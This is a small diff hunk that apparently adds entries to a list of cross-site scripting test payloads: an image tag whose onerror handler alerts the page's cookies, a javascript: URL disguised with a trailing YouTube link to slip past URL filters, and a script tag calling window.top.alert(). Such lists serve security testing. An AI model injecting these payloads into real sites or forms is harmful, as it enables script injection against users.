@@ -38,3 +38,6 @@
 
 '"><img src=x onerror​="alert(document.cookie)">
 
+javascript:alert();//https://youtube.com
+
+<script>window.top.alert();</script>
